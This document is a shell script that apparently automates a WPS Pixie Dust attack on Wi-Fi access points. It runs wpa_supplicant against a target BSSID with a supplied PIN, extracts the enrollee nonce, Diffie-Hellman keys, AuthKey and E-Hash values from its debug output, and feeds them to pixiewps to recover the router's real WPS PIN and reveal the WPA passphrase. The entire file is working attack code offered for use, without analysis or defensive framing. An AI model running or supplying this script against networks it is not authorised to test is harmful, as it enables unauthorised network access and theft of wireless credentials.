#!/bin/sh

TEMPDIR=$(mktemp -d)
TEMPFILE=$(mktemp --suffix=.conf)
FIFO=$(mktemp -u)
mkfifo $FIFO

BSSID=$1
PIN=$2
IFACE=$3

function quit() 
{
	PID=$(jobs -l | awk '{print $2}')
	echo $PID
	kill $PID
	rm -rf $TEMPDIR $TEMPFILE $FIFO
	exit
}

function gethex()
{
	echo $1 | cut -d : -f 3 | sed --expression='s/ //g'
}

function printI()
{
	echo "[*] $@"
}

function printE()
{
	echo "[-] $@"
}
function printG()
{
	echo "[+] $@"
}

#Start here
#Write wpa_supplicant config to file
printI "Writing wpa_supplicant config"
echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE

printI "Launching wpa_supplicant"
wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE > $FIFO &

#Send WPS_REG command to wpa_supplicant socket
printI "Sending WPS_REG command to wpa_supplicant"
sleep 2 && echo "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &

#Launch wpa_supplicant & parse output
while read -r LINE
do
	if [ "$(echo "$LINE" | grep 'WPS: ')" ]
	then
		printI "$LINE"
		if [ "$(echo "$LINE" | grep 'Building Message M')" ]
		then
			printI "Sending WPS Message: "
			printI "$LINE"
		fi
		
		if [ "$(echo "$LINE" | grep 'Received M')" ]
		then
			printI 'Received WPS Message: '
			printI "$LINE"
		fi
		
		if [ "$(echo "$LINE" | grep 'Received WSC_NACK')" ]
		then
			printI 'Received WSC NACK'
			printE 'Error: wrong PIN code'
			quit
		fi

		if [ "$(echo "$LINE" | grep 'Enrollee Nonce')" ]
		then
			ENONCE=$(gethex "$LINE")
			printG "E-Nonce: $ENONCE"
		fi

		if [ "$(echo "$LINE" | grep 'DH Private Key')" ] 
		then
			PKR=$(gethex "$LINE")
			printG "PKR: $PKR"
		fi
		
		if [ "$(echo "$LINE" | grep 'DH own Public Key')" ] 
		then
			PKR=$(gethex "$LINE")
			printG "PKR: $PKR"
		fi

		if [ "$(echo "$LINE" | grep 'DH peer Public Key')" ]
		then
			PKE=$(gethex "$LINE")
			printG "PKE: $PKE"
		fi

		if [ "$(echo "$LINE" | grep 'AuthKey')" ]
		then
			AUTHKEY=$(gethex "$LINE")
			printG "AuthKey: $AUTHKEY"
		fi
		if [ "$(echo "$LINE" | grep 'E-Hash1')" ]
		then
			EHASH1=$(gethex "$LINE")
			printG "E-Hash1: $EHASH1"
		fi
		if [ "$(echo "$LINE" | grep 'E-Hash2')" ]
		then
			EHASH2=$(gethex "$LINE")
			printG "E-Hash2: $EHASH2"
		fi
		
		if [ "$(echo "$LINE" | grep 'Network Key')" ]
		then
			WPA_KEY=$(gethex "$LINE")
			printG "WPA pass: $WPA_KEY"
		fi
		
	elif [ "$(echo "$LINE" | grep ': State: ')" ]
	then
		if [ "$(echo "$LINE" | grep 'scan')" ]
		then
			printI "Scanning…"
		fi
		
	elif [ "$(echo "$LINE" | grep 'WPS-FAIL')" ]
	then
		printE "wpa_supplicant returned WPS-FAIL"
		quit
	fi

	if [ "$PKE" ] && [ "$PKR" ] && [ "$EHASH1" ] && [ "$EHASH2" ] && [ "$ENONCE" ]
	then
		break
	fi
done < $FIFO

#Launch pixiewps to get real pin
pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force

#Remove temp files and exit
quit
